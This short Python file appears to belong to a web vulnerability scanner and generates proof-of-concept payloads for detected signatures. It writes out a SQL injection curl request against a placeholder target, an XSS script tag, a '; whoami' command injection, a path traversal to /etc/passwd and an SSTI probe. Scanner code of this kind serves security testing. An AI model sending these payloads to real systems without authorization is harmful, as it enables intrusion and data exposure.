from web_engine.signature_db import SIGNATURES

def generate_poc(vuln, request):
    """Generate PoC based on detected vulnerability signature."""
    sig = vuln["signature"]

    if sig.startswith("SQLI"):
        # Use real endpoint if available
        path = request.get("path", "/")
        return f"curl -X GET \"http://TARGET{path}?id=1' OR '1'='1 -- \""

    if sig == "XSS_BASIC":
        return "<script>alert('ADEXA XSS')</script>"

    if sig == "CMD_INJECTION":
        return "; whoami"

    if sig == "PATH_TRAVERSAL":
        return "../../../../../etc/passwd"

    if sig == "SSTI":
        return "{{7*7}}"

    return "PoC not implemented for this signature."
